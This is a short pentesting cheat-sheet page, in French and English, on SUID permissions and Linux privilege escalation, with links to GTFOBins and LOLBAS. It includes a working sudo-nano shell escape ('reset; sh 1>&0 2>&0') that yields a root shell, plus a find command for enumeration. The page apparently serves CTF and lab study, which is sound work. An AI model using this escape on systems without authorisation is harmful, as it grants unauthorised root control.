<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](server_procedure.md)</sub>
#SUID : Set owner User ID

**Présentation :** Commonly noted as SUID (Set owner User ID), the special permission for the user access level has a single function: A file with SUID always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase S here.

**Linux :**
- *sudo -l* : si présence de *User **USER** may run the following **commands** on base: (root : root) **PATH*** : privilege escalation
- liste : https://gtfobins.github.io/
 
**Exemple :**
- nano : *User **USER** may run the following commands on openadmin:    (ALL) NOPASSWD: /bin/nano /opt/priv*
  - sudo nano *FICHIER* => une fois dans nano => CTRL+R puis CTRL+X => *reset; sh 1>&0 2>&0* => on est en root
- find : *find / -group *NOM DU GROUPE* 2>/dev/null*

**Windows :**
- liste : https://lolbas-project.github.io/


